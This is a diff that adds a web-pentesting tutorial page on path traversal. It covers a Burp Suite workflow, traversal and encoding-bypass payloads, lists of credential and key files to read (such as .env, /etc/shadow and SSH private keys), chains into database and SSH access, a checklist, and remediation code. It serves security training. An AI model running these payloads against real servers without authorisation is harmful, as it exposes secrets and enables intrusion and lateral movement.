@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <!-- Clickjacking defense: hide content until JS confirms top frame -->
+  <style id="cj-guard">html{display:none!important}</style>
+  <script>(function(){if(self===top){var s=document.getElementById('cj-guard');if(s)s.parentNode.removeChild(s);}else{try{top.location.href=self.location.href;}catch(e){}}})();</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Path traversal testing guide: directory traversal detection, encoding bypass, and file disclosure exploitation with practical Burp Suite workflows.">
+    <meta property="og:title" content="Path Traversal – Web App Pentesting Guide">
+    <meta property="og:description" content="Path traversal testing guide: directory traversal detection, encoding bypass, and file disclosure exploitation with practical Burp Suite workflows.">
+    <meta property="og:type" content="article">
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'/%3E%3C/svg%3E">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <title>Path Traversal  · Web Pentest Playbook</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="topnav">
+  <div class="nav-logo">
+    <a href="../index.html" class="logo-link">
+      <div class="logo-icon">
+        <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><path d="M5 9v3M9 9v3M3.5 12h7" stroke="#a78bfa" stroke-width="1.2" stroke-linecap="round"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+      </div>
+      <span class="logo-text">Web Pentest</span>
+      <span class="logo-tag">v2025</span>
+    </a>
+  </div>
+  <div class="nav-center">
+    <a href="../index.html" class="nav-link">Home</a>
+    <a href="../index.html" class="nav-link active">Vulnerabilities</a>
+    <a href="../web-pentest-playbook.html" class="nav-link">Playbook</a>
+    <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="nav-link">Labs ↗</a>
+    <a href="../thanks.html" class="nav-link">Thanks</a>
+  </div>
+  <div class="nav-right">
+    <button class="search-pill" onclick="gsOpen ? gsOpen() : null">
+      <svg width="11" height="11" viewBox="0 0 16 16" fill="none"><circle cx="7" cy="7" r="5" stroke="currentColor" stroke-width="1.5"/><path d="m11 11 3 3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
+      Search <kbd>⌘K</kbd>
+    </button>
+    <button class="hamburger" id="hamburger" aria-label="Menu">☰</button>
+    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">☀ Light</button>
+  </div>
+</nav>
+
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<div class="layout">
+  <nav id="sidebar">
+    <div class="toc-title">Path Traversal (Directory Traversal)</div>
+    <div class="sb-group">Overview</div>
+    <a href="#analogy">Real-World Analogy</a>
+    <a href="#methodology">📅 Workflow Placement</a>
+    <a href="#how-it-works">How It Works</a>
+    <div class="sb-group">Attack Vectors</div>
+    <a href="#where-to-look">Where to Look</a>
+    <a href="#burp-workflow">Burp Suite Workflow</a>
+    <div class="sb-group">Exploitation</div>
+    <a href="#payloads">Payloads & Techniques</a>
+    <a href="#waf-bypass">WAF Bypass</a>
+    <a href="#exploitation">Exploitation & Impact</a>
+    <div class="sb-group">Practice</div>
+    <a href="#checklist">Testing Checklist</a>
+    <a href="#labs">PortSwigger Labs</a>
+    <a href="#remediation">Remediation</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#see-also">🔗 See Also</a>
+  </nav>
+
+  <main id="main">
+    <div class="hero">
+      <div class="hero-chip"><span class="hero-chip-dot"></span>OWASP A01 · CVSS 7.5 · Day 3</div>
+      <h1><span class="hero-icon-pill"><svg class="icon" viewBox="0 0 24 24" aria-hidden="true"><rect x="13" y="3" width="8" height="6" rx="1"/><rect x="13" y="15" width="8" height="6" rx="1"/><path d="M5 3v15a2 2 0 0 0 2 2h6"/><path d="M5 8h8"/></svg></span><span>Path Traversal (Directory Traversal)</span></h1>
+      <p>A widespread vulnerability where user input is incorporated into file paths without proper validation, allowing attackers to escape the intended directory and read arbitrary files on the server (or write files in vulnerable cases).</p>
+      <div class="badge-row">
+        <span class="badge badge-high">High</span>
+        <span class="badge badge-bscp">BSCP</span>
+        <span class="badge badge-difficulty">Beginner</span>
+      </div>
+    </div>
+
+    <section id="analogy">
+      <h2>Real-World Analogy</h2>
+      <div class="callout analogy">
+        <div class="callout-title">Library Shelf Navigation</div>
+        <p>Imagine a library where you can request any book by specifying a shelf number. You ask the librarian, "Please get me the book on shelf 5." They return it without question. Now what if you ask, "Please get me the book on shelf ../../../manager's office/employee_salaries.pdf"? If the librarian literally follows your path  · going to shelf 5, then up three levels (../..) to exit the book section entirely, then entering the manager's office  · they'd hand you confidential files you were never supposed to see. That's path traversal. The server blindly follows the path you provide, allowing you to navigate outside the intended directory.</p>
+      </div>
+    </section>
+
+    <section id="methodology">
+      <h2>📅 When in the 5-Day Workflow</h2>
+
+      <div class="workflow-days">
+        <div class="day-pill"><span class="day-num">Day 1</span>Recon</div>
+        <div class="day-pill probe"><span class="day-num">Day 2</span>Initial Probe</div>
+        <div class="day-pill deep"><span class="day-num">Day 3</span>Deep Dive</div>
+        <div class="day-pill"><span class="day-num">Day 4</span>Server-Side</div>
+        <div class="day-pill"><span class="day-num">Day 5</span>Client-Side</div>
+      </div>
+
+      <div class="callout method-probe">
+        <div class="callout-title">⚡ Day 2  · Initial Probe</div>
+        <p>On Day 2, inject <code>../../../etc/passwd</code> into any parameter that looks like it reads a file: <code>?file=</code>, <code>?page=</code>, <code>?path=</code>, <code>?template=</code>, <code>?document=</code>, download endpoints. Look for the word "root" in the response, or a suddenly different response length. Mark it and move on.</p>
+      </div>
+
+      <div class="callout method-deep">
+        <div class="callout-title">🎯 Day 3  · Deep Path Traversal</div>
+        <p>Return to parameters flagged on Day 2. If the basic <code>../</code> was blocked, try encoded variants. Read files that give you the most value: first <code>/etc/passwd</code> to confirm, then app configuration files to find credentials:</p>
+        <pre><code># Encoding bypass attempts
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+....//....//....//etc/passwd
+
+# High-value targets
+/etc/passwd                          # user list
+/proc/self/environ                   # env vars with secrets
+/var/www/html/.env                   # Laravel/PHP secrets
+/app/config/database.yml             # Rails DB creds
+/home/user/.ssh/id_rsa               # SSH private key
+/etc/nginx/sites-enabled/default     # web server config</code></pre>
+        <p><strong>Chain it:</strong> Path traversal → read .env file → find API keys or DB password → SQLi or direct DB access. Or: read SSH private key → SSH into the server.</p>
+      </div>
+    </section>
+
+    <section id="how-it-works">
+      <h2>How It Works</h2>
+      <p>Path traversal is a simple but powerful vulnerability. When an application constructs file paths using user input, it may fail to validate or sanitize the input. Attackers exploit this by:</p>
+      <ol class="steps">
+        <li><strong>Identify a file-serving parameter.</strong> Look for parameters like <code>file</code>, <code>path</code>, <code>page</code>, <code>template</code>, or <code>doc</code>.</li>
+        <li><strong>Use ../ to traverse up directories.</strong> Each <code>../</code> moves up one directory level. <code>../../</code> moves up two levels, etc.</li>
+        <li><strong>Navigate to the target file.</strong> Construct a path that exits the intended directory and reaches sensitive files like <code>/etc/passwd</code>.</li>
+        <li><strong>Retrieve the file.</strong> If the path is valid and readable by the web server process, the file content is returned in the response.</li>
+      </ol>
+      <p><strong>Why it works:</strong> The server trusts user input when constructing filesystem paths. Without validation, <code>../</code> sequences are treated as legitimate path components.</p>
+    </section>
+
+    <section id="where-to-look">
+      <h2>Where to Look</h2>
+      <p>Path traversal can appear in many contexts:</p>
+      <ul>
+        <li><strong>File serving parameters:</strong> <code>file=</code>, <code>path=</code>, <code>filename=</code>, <code>page=</code></li>
+        <li><strong>Template/include mechanisms:</strong> <code>template=</code>, <code>include=</code>, <code>lang=</code> (language files)</li>
+        <li><strong>Download endpoints:</strong> <code>download.php?file=document.pdf</code></li>
+        <li><strong>API endpoints:</strong> <code>/api/files/123</code> where the ID is user-controlled</li>
+        <li><strong>Log viewers:</strong> <code>log=</code> parameter to view application logs</li>
+        <li><strong>Content rendering:</strong> Features that render markdown or document content from a path</li>
+        <li><strong>Static file serving:</strong> <code>/assets/filename</code> where filename is user-supplied</li>
+      </ul>
+      <p><strong>Common vulnerable patterns:</strong></p>
+      <pre><code>http://target.com/download?file=report.pdf
+http://target.com/page?page=home.html
+http://target.com/api/document/123
+http://target.com/view?template=header.html</code></pre>
+    </section>
+
+    <section id="burp-workflow">
+      <h2>Burp Suite Workflow</h2>
+
+      <div class="burp-step">
+        <div class="step-num">1</div>
+        <div>
+          <strong>Identify file-serving functionality.</strong> Navigate to a page with a file parameter (download, view, page, etc.). Intercept the request in Burp Proxy.
+          <pre><code>GET /download?file=report.pdf HTTP/1.1
+Host: target.com</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">2</div>
+        <div>
+          <strong>Send to Repeater.</strong> Right-click the request and send it to Repeater for testing.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">3</div>
+        <div>
+          <strong>Test with ../ sequences.</strong> Replace the filename with traversal sequences. Start with one level up:
+          <pre><code>GET /download?file=../../../etc/passwd HTTP/1.1</code></pre>
+          Try different numbers of <code>../</code> sequences. On Linux/Unix, <code>/etc/passwd</code> is at the root, so you may need several levels.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">4</div>
+        <div>
+          <strong>Observe the response.</strong> If the file is readable, the response body will contain the file content. If you see user accounts and hashes, you've found the vulnerability.
+          <pre><code>root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">5</div>
+        <div>
+          <strong>If ../ is blocked, try encoded versions.</strong> The server may filter <code>../</code> but miss encoded versions:
+          <pre><code>%2e%2e%2f         (URL encoded)
+%252e%252e%252f   (double URL encoded)
+..%252f           (mixed encoding)
+%2e%2e/</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">6</div>
+        <div>
+          <strong>Try absolute paths.</strong> If relative paths are blocked, try absolute paths directly:
+          <pre><code>GET /download?file=/etc/passwd HTTP/1.1</code></pre>
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">7</div>
+        <div>
+          <strong>Try null byte termination (legacy systems).</strong> On older systems, null bytes truncate strings:
+          <pre><code>file=../../../../etc/passwd%00.pdf</code></pre>
+          The server reads up to the null byte, ignoring the .pdf suffix.
+        </div>
+      </div>
+
+      <div class="burp-step">
+        <div class="step-num">8</div>
+        <div>
+          <strong>Test common sensitive files.</strong> Once you confirm traversal works, read various sensitive files to assess impact.
+        </div>
+      </div>
+
+    </section>
+
+    <section id="payloads">
+      <h2>Payloads & Techniques</h2>
+
+      <h3>Basic Path Traversal</h3>
+      <pre><code>../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../</code></pre>
+
+      <h3>Linux/Unix Target Files</h3>
+      <p>Common files to target on Linux servers:</p>
+      <pre><code>/etc/passwd              (user accounts and UIDs)
+/etc/shadow              (password hashes  · requires root)
+/etc/hosts               (hostname mappings)
+/etc/hostname            (server name)
+/etc/resolv.conf         (DNS configuration)
+/etc/ssl/certs/          (SSL certificates)
+/proc/self/environ       (environment variables)
+/proc/self/cmdline       (process command line)
+/proc/version            (kernel version)
+~/.bash_history          (user command history)
+~/.ssh/id_rsa            (SSH private key)
+~/.ssh/authorized_keys   (SSH public keys)
+/var/log/apache2/access.log  (web server logs)
+/var/log/nginx/access.log
+/var/www/html/.env       (app secrets)
+/app/config.php          (application config)</code></pre>
+
+      <h3>Windows Target Files</h3>
+      <p>Common files on Windows servers:</p>
+      <pre><code>C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\drivers\etc\networks
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles\
+C:\boot.ini
+C:\pagefile.sys</code></pre>
+
+      <h3>Application-Specific Config Files</h3>
+      <p>Secrets are often stored in config files:</p>
+      <pre><code>.env                  (environment variables)
+config.php            (database credentials)
+database.yml          (Rails database config)
+web.config            (IIS configuration)
+web.xml               (Java configuration)
+settings.json         (Node.js config)
+secrets.json          (app secrets)
+connection.properties  (database connection)
+application.properties (Spring Boot)</code></pre>
+
+      <h3>URL Encoding Variations</h3>
+      <p>Bypass simple filters that look for literal <code>../</code>:</p>
+      <pre><code>%2e%2e%2f            (URL encoded)
+%252e%252e%252f      (double URL encoded)
+..%2f                (partial encoding)
+%2e%2e/              (mixed case and encoding)
+.%2e%2f              (encoded dot)
+%3A%2F%2F            (encoded ://)
+0x2e0x2e0x2f         (hex-like, if processed)</code></pre>
+
+      <h3>Unicode/UTF-8 Encoding Bypass</h3>
+      <p>Some systems accept Unicode representations:</p>
+      <pre><code>..%c0%af         (overlong UTF-8 for /)
+..%c1%9c         (overlong UTF-8 for /)
+%e0%80%ae%e0%80%ae%c0%af  (complex unicode bypass)</code></pre>
+
+      <h3>Windows Backslash Traversal</h3>
+      <pre><code>..\.
+..\..\.
+..%5c..%5c        (encoded backslash)</code></pre>
+
+      <h3>Null Byte Termination (PHP &lt; 5.3.4)</h3>
+      <p>Truncates the path at the null byte:</p>
+      <pre><code>../../../../etc/passwd%00.php
+../../../../etc/passwd%00.jpg</code></pre>
+
+      <h3>Absolute Paths</h3>
+      <pre><code>/etc/passwd
+C:\Windows\win.ini
+/var/www/html/config.php</code></pre>
+
+    </section>
+
+    <section id="checklist">
+      <h2>Testing Checklist</h2>
+      <div class="checklist-wrap">
+        <div class="checklist-header">
+          Progress: <span class="progress-mini">0/12</span>
+          <div class="progress-bar-wrap"><div class="progress-bar"></div></div>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check1">
+          <label for="check1">Identify all file-serving parameters (file=, page=, template=, etc.)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check2">
+          <label for="check2">Test basic ../../../etc/passwd on assumed Linux targets</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check3">
+          <label for="check3">Test Windows paths (C:\Windows\win.ini) if OS unknown</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check4">
+          <label for="check4">Try URL-encoded versions (%2e%2e%2f) if ../ is blocked</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check5">
+          <label for="check5">Test double URL-encoded (%252e%252e%252f) as backup</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check6">
+          <label for="check6">Try absolute paths (/etc/passwd) to bypass relative path filters</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check7">
+          <label for="check7">Test null byte bypass (../../../../etc/passwd%00.jpg) on legacy systems</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check8">
+          <label for="check8">Attempt Unicode/UTF-8 encoding (%c0%af) if other methods fail</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check9">
+          <label for="check9">Read /etc/passwd to confirm vulnerability and enumerate users</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check10">
+          <label for="check10">Extract application config files (.env, config.php, web.config)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check11">
+          <label for="check11">Attempt to read SSH private keys (~/.ssh/id_rsa)</label>
+        </div>
+        <div class="checklist-item">
+          <input type="checkbox" id="check12">
+          <label for="check12">Read source code files to identify other vulnerabilities</label>
+        </div>
+      </div>
+    </section>
+
+    <section id="waf-bypass">
+      <h2>WAF Bypass Techniques</h2>
+
+      <h3>URL Encoding Levels</h3>
+      <p>Many WAFs filter literal <code>../</code> but miss encoded versions:</p>
+      <pre><code>Single URL encoding:   %2e%2e%2f
+Double URL encoding:   %252e%252e%252f
+Mixed encoding:        ..%2f
+Partial encoding:      %2e%2e/</code></pre>
+
+      <h3>Case and Mixed Encoding</h3>
+      <pre><code>..%2F       (lowercase %2f)
+..%2f       (different case)
+%2E%2E%2F   (uppercase dots)</code></pre>
+
+      <h3>16-Bit Unicode Encoding</h3>
+      <p>Some systems process 16-bit Unicode even in URL context:</p>
+      <pre><code>%c0%ae%c0%ae%c0%af     (overlong UTF-8 encoding of ../)
+%e0%80%ae              (alternative overlong UTF-8)</code></pre>
+
+      <h3>Backslash + Forward Slash Mix (Windows)</h3>
+      <pre><code>..\.
+..%5c          (encoded backslash)
+..\..%2f      (mixed separators)</code></pre>
+
+      <h3>Dot Variations (if dots are filtered)</h3>
+      <p>If literal dots are blocked:</p>
+      <pre><code>%2e%2e%2f     (encoded dots and slash)
+%252e%252e%252f  (double encoded)</code></pre>
+
+      <h3>Absolute Path Bypass</h3>
+      <p>If relative path traversal is blocked, try absolute paths directly:</p>
+      <pre><code>Original: file=../../etc/passwd  (blocked)
+Bypass:   file=/etc/passwd       (not matched by ../ filter)</code></pre>
+
+      <h3>Case Sensitivity Tricks</h3>
+      <pre><code>../ vs ../   (if inconsistently validated)
+File vs file (parameter name case)
+Exploit case-insensitive filesystems</code></pre>
+
+      <h3>Null Byte Termination</h3>
+      <p>Legacy systems (PHP &lt; 5.3.4) ignore content after %00:</p>
+      <pre><code>../../../../etc/passwd%00.pdf
+Request stops at null byte, .pdf is ignored</code></pre>
+
+    </section>
+
+    <section id="exploitation">
+      <h2>Exploitation & Impact</h2>
+
+      <h3>Read Application Config Files</h3>
+      <p><strong>Impact: Critical.</strong> Config files often contain secrets:</p>
+      <ul>
+        <li><strong>.env file:</strong> Database passwords, API keys, JWT secrets.</li>
+        <li><strong>database.yml (Rails):</strong> Database credentials in plaintext.</li>
+        <li><strong>config.php:</strong> API keys, third-party credentials.</li>
+        <li><strong>web.config (IIS):</strong> Connection strings with passwords.</li>
+        <li><strong>.git/config:</strong> Repository credentials.</li>
+      </ul>
+      <pre><code>Payload: ../../../.env
+Response:
+DATABASE_PASSWORD=SecurePass123
+AWS_SECRET_KEY=AKIA2KJF...
+JWT_SECRET=super_secret_key</code></pre>
+
+      <h3>Enumerate System Users</h3>
+      <p><strong>Impact: High.</strong> /etc/passwd reveals all users and their home directories:</p>
+      <pre><code>Payload: ../../../etc/passwd
+Response:
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+user1:x:1000:1000:User One:/home/user1:/bin/bash</code></pre>
+
+      <h3>Extract SSH Private Keys</h3>
+      <p><strong>Impact: Critical.</strong> SSH keys allow login to other systems:</p>
+      <pre><code>Payload: ../../../home/user/.ssh/id_rsa
+Response: [RSA PRIVATE KEY]
+---BEGIN OPENSSH PRIVATE KEY---
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHI...
+---END OPENSSH PRIVATE KEY---</code></pre>
+
+      <h3>Read Application Source Code</h3>
+      <p><strong>Impact: Critical.</strong> Source code reveals:</p>
+      <ul>
+        <li>Hard-coded credentials or API keys.</li>
+        <li>Logic flaws and additional vulnerabilities.</li>
+        <li>Database schema and internal APIs.</li>
+        <li>Authentication/authorization mechanisms.</li>
+      </ul>
+      <pre><code>Payload: ../../../var/www/html/index.php
+Response: [Full PHP source code]</code></pre>
+
+      <h3>Retrieve Sensitive Environment Variables</h3>
+      <p><strong>Impact: High.</strong> Process environment variables may contain secrets:</p>
+      <pre><code>Payload: ../../../proc/self/environ
+Response: (contains full environment)</code></pre>
+
+      <h3>Access System Information</h3>
+      <p><strong>Impact: Medium.</strong> System files reveal infrastructure details:</p>
+      <ul>
+        <li><strong>/etc/hostname:</strong> Server name.</li>
+        <li><strong>/etc/os-release:</strong> Operating system version.</li>
+        <li><strong>/proc/version:</strong> Kernel version.</li>
+        <li><strong>Web server logs:</strong> Access patterns, other usernames, etc.</li>
+      </ul>
+
+      <h3>Database Compromise</h3>
+      <p><strong>Impact: Critical.</strong> With database credentials from config files:</p>
+      <ul>
+        <li>Direct database access (dump all data).</li>
+        <li>Modify or delete data.</li>
+        <li>Execute stored procedures or database functions.</li>
+      </ul>
+
+      <h3>Lateral Movement</h3>
+      <p><strong>Impact: High.</strong> SSH keys and credentials enable pivot attacks:</p>
+      <ul>
+        <li>Use stolen SSH keys to access other servers.</li>
+        <li>Use database credentials to compromise databases on internal networks.</li>
+        <li>Exploit other systems using extracted credentials.</li>
+      </ul>
+
+    </section>
+
+    <section id="remediation">
+      <h2>Remediation</h2>
+
+      <h3>1. Use Basename to Strip Path Components</h3>
+      <p>Extract only the filename, removing any directory traversal:</p>
+      <pre><code>const path = require('path');
+const userInput = request.query.file;
+const filename = path.basename(userInput);  // Strips all ../ sequences
+const filepath = path.join('/uploads', filename);
+fs.readFile(filepath, (err, data) => { ... });</code></pre>
+
+      <h3>2. Resolve Path and Validate Prefix</h3>
+      <p>Convert to absolute path and verify it stays within intended directory:</p>
+      <pre><code>const path = require('path');
+const uploadDir = path.resolve('/var/www/uploads');
+const userInput = request.query.file;
+const fullPath = path.resolve(uploadDir, userInput);
+
+if (!fullPath.startsWith(uploadDir)) {
+  throw new Error('Path traversal detected');
+}
+
+fs.readFile(fullPath, (err, data) => { ... });</code></pre>
+
+      <h3>3. Whitelist Allowed Filenames</h3>
+      <p>Only serve explicitly approved files:</p>
+      <pre><code>const ALLOWED_FILES = ['report.pdf', 'summary.html', 'data.json'];
+const requested = request.query.file;
+if (!ALLOWED_FILES.includes(requested)) {
+  return response.status(403).send('File not allowed');
+}
+fs.readFile('/public/' + requested, ...);
+</code></pre>
+
+      <h3>4. Use a File ID Mapping Instead of Paths</h3>
+      <p>Map user-visible IDs to actual filenames (best practice):</p>
+      <pre><code>const FILE_MAP = {
+  '1': '/var/www/docs/report.pdf',
+  '2': '/var/www/docs/summary.pdf',
+};
+
+const fileId = request.query.id;
+if (!FILE_MAP[fileId]) {
+  return response.status(404).send('Not found');
+}
+const filepath = FILE_MAP[fileId];
+fs.readFile(filepath, ...);
+</code></pre>
+
+      <h3>5. Never Pass User Input Directly to Filesystem Functions</h3>
+      <p>This is the core principle  · always validate before use:</p>
+      <pre><code>// VULNERABLE
+fs.readFile(request.query.file, ...);
+
+// SECURE
+const filename = path.basename(request.query.file);
+fs.readFile(path.join('/safe/dir', filename), ...);
+</code></pre>
+
+      <h3>6. Implement Access Control</h3>
+      <p>Ensure users can only access their own files:</p>
+      <pre><code>const userId = request.user.id;
+const fileOwnerId = database.getFileOwner(fileId);
+if (userId !== fileOwnerId && !isAdmin(userId)) {
+  return response.status(403).send('Unauthorized');
+}
+</code></pre>
+
+      <h3>7. Use Secure APIs</h3>
+      <p>Some frameworks provide safe file serving:</p>
+      <ul>
+        <li><strong>Express.js:</strong> Use <code>sendFile()</code> with strict path validation.</li>
+        <li><strong>Rails:</strong> Use <code>render :file</code> with validated paths.</li>
+        <li><strong>PHP:</strong> Use <code>readfile()</code> with validated paths, not user input.</li>
+      </ul>
+
+      <h3>8. Log & Monitor File Access</h3>
+      <p>Alert on suspicious patterns:</p>
+      <ul>
+        <li>Requests containing <code>../</code> or URL-encoded variations.</li>
+        <li>Attempts to access files outside the intended directory.</li>
+        <li>Access to sensitive files like .env, config.php, etc.</li>
+      </ul>
+
+    </section>
+
+    <section id="labs">
+      <h2>PortSwigger Labs</h2>
+      <p>Practice path traversal attacks on PortSwigger's free labs. Start with basic traversal and progress to encoding bypasses:</p>
+      <ul>
+        <li><strong>File path traversal, simple case</strong></li>
+        <li><strong>File path traversal, traversal sequences blocked with absolute path bypass</strong></li>
+        <li><strong>File path traversal, traversal sequences stripped non-recursively</strong></li>
+        <li><strong>File path traversal, traversal sequences stripped with superfluous URL-decode</strong></li>
+        <li><strong>File path traversal, validation of start of path</strong></li>
+        <li><strong>File path traversal, validation of file extension with null byte bypass</strong></li>
+      </ul>
+      <p>Visit <code>portswigger.net/web-security/file-path-traversal</code> to access the labs.</p>
+    </section>
+
+    <section id="mistakes">
+      <h2>Common Beginner Mistakes</h2>
+
+      <div class="callout warn">
+        <div class="callout-title">Only Trying ../</div>
+        <p><strong>Mistake:</strong> Testing <code>../../../etc/passwd</code> with a fixed number of sequences. If the application is several directories deep, you might need more or fewer <code>../</code> levels. <strong>Fix:</strong> Try multiple sequences: <code>../</code>, <code>../../</code>, <code>../../../</code>, up to <code>../../../../../</code> and beyond. The worst case is just a slightly deeper path.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Testing Encoded Versions</div>
+        <p><strong>Mistake:</strong> If <code>../</code> fails, immediately assuming path traversal isn't possible. Simple filters block literal <code>../</code> but miss URL-encoded versions. <strong>Fix:</strong> Always test <code>%2e%2e%2f</code> (URL encoded) and <code>%252e%252e%252f</code> (double encoded). These are critical bypass techniques.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Not Testing Windows Paths When Unknown OS</div>
+        <p><strong>Mistake:</strong> Assuming the target is Linux and only trying Unix paths. Windows servers are equally common. <strong>Fix:</strong> When the OS is unknown, test both <code>../../../../etc/passwd</code> (Linux) and <code>C:\Windows\win.ini</code> (Windows). Try both conventions.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Only Looking for /etc/passwd</div>
+        <p><strong>Mistake:</strong> Testing path traversal only for /etc/passwd and giving up if it fails. But the vulnerability might still allow reading application config files. <strong>Fix:</strong> Once you confirm traversal works, read .env, config.php, web.config, and source code files. These are often more valuable than /etc/passwd.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Forgetting Absolute Paths</div>
+        <p><strong>Mistake:</strong> If relative path traversal is blocked, assuming path traversal doesn't exist. But absolute paths might work. <strong>Fix:</strong> Try <code>/etc/passwd</code> directly without any <code>../</code> sequences. Filters often check for <code>../</code> but allow absolute paths.</p>
+      </div>
+
+      <div class="callout warn">
+        <div class="callout-title">Ignoring Null Byte Bypass</div>
+        <p><strong>Mistake:</strong> On legacy systems, file extension validation can be bypassed with %00 (null byte). <strong>Fix:</strong> Try <code>../../../../etc/passwd%00.jpg</code>. The null byte terminates the string, and the .jpg extension is ignored.</p>
+      </div>
+
+    </section>
+
+    <h2 id="see-also">🔗 See Also  · Attack Chains</h2>
+    <p>Path traversal is rarely the end goal  · it's usually the first step in a larger chain.</p>
+    <div class="see-also-grid">
+      <a class="see-also-card" href="file-upload.html">
+        <span class="sa-icon">📂</span>
+        <span class="sa-name">File Upload</span>
+        <span class="sa-why">Combine path traversal in the upload filename with a webshell payload  · upload to a web-accessible directory.</span>
+      </a>
+      <a class="see-also-card" href="ssrf.html">
+        <span class="sa-icon">📡</span>
+        <span class="sa-name">SSRF</span>
+        <span class="sa-why">SSRF with file:// protocol achieves the same result as path traversal  · read arbitrary server files.</span>
+      </a>
+      <a class="see-also-card" href="sqli.html">
+        <span class="sa-icon">🗄️</span>
+        <span class="sa-name">SQL Injection</span>
+        <span class="sa-why">Read the app's .env or database.yml via path traversal → find DB credentials → direct database access or SQLi.</span>
+      </a>
+      <a class="see-also-card" href="ssti.html">
+        <span class="sa-icon">📝</span>
+        <span class="sa-name">SSTI</span>
+        <span class="sa-why">Path traversal in a template-rendering endpoint (e.g., ?page=../../etc/passwd) may trigger SSTI if the file is rendered as a template.</span>
+      </a>
+    </div>
+
+  </main>
+</div>
+
+<script>
+(function(){
+  var t = localStorage.getItem('theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', t);
+  var btn = document.getElementById('theme-toggle');
+  if(btn){
+    btn.textContent = t === 'dark' ? '☀ Light' : '🌙 Dark';
+    btn.addEventListener('click', function(){
+      var n = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+      document.documentElement.setAttribute('data-theme', n);
+      localStorage.setItem('theme', n);
+      btn.textContent = n === 'dark' ? '☀ Light' : '🌙 Dark';
+    });
+  }
+  var ham = document.getElementById('hamburger');
+  var sb = document.getElementById('sidebar');
+  var ov = document.getElementById('sidebar-overlay');
+  if(ham && sb && ov){
+    ham.addEventListener('click', function(){ sb.classList.toggle('open'); ov.classList.toggle('open'); });
+    ov.addEventListener('click', function(){ sb.classList.remove('open'); ov.classList.remove('open'); });
+  }
+})();
+</script>
+<script src="search.js"></script>
+<script>
+document.querySelectorAll('pre').forEach(pre => {
+  const btn = document.createElement('button');
+  btn.className = 'copy-btn'; btn.textContent = 'Copy';
+  pre.appendChild(btn);
+  btn.addEventListener('click', () => {
+    navigator.clipboard.writeText(pre.querySelector('code')?.innerText || pre.innerText);
+    btn.textContent = 'Copied!'; btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+  });
+});
+const sections = document.querySelectorAll('[id]');
+const navLinks = document.querySelectorAll('#sidebar a');
+const observer = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) navLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === '#' + e.target.id));
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+sections.forEach(s => observer.observe(s));
+const STORAGE_KEY = 'path-traversal-checklist-';
+document.querySelectorAll('.checklist-item input[type=checkbox]').forEach((cb, i) => {
+  const saved = localStorage.getItem(STORAGE_KEY + i);
+  if (saved === 'true') { cb.checked = true; cb.closest('.checklist-item').classList.add('done'); }
+  cb.addEventListener('change', () => {
+    localStorage.setItem(STORAGE_KEY + i, cb.checked);
